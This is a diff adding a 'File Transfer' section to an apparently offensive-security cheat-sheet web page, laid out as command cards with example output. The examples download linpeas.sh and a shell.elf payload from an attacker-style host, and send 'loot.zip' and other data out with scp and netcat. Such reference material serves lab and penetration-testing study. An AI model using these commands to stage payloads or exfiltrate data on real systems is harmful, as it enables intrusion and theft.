@@ -1,0 +1,33 @@
+<div class="section" data-category="transfer">
+    <div class="section-header">
+        <div class="section-icon files">📤</div>
+        <h3>File Transfer</h3>
+    </div>
+    <ul class="command-list">
+        <li class="command-item">
+            <span class="cmd">python3 -m http.server 8000</span>
+            <span class="desc">Simple HTTP server</span>
+            <code class="example">$ python3 -m http.server 8000<br>Serving HTTP on 0.0.0.0 port 8000</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">wget http://IP/file</span>
+            <span class="desc">Download file</span>
+            <code class="example">$ wget http://10.10.14.5:8000/linpeas.sh<br>linpeas.sh  100%[===&gt;] 620K</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">curl -O http://IP/file</span>
+            <span class="desc">Fetch file</span>
+            <code class="example">$ curl -O http://10.10.14.5:8000/shell.elf<br>% Total  Received  100%</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">scp file user@IP:/path</span>
+            <span class="desc">Secure copy</span>
+            <code class="example">$ scp loot.zip kali@10.10.14.5:/tmp<br>loot.zip  100%  45KB</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">nc -w 3 IP 1234 &lt; file</span>
+            <span class="desc">Netcat transfer</span>
+            <code class="example">$ nc -w 3 10.10.14.5 1234 &lt; data.txt<br>(file sent to listener)</code>
+        </li>
+    </ul>
+</div>
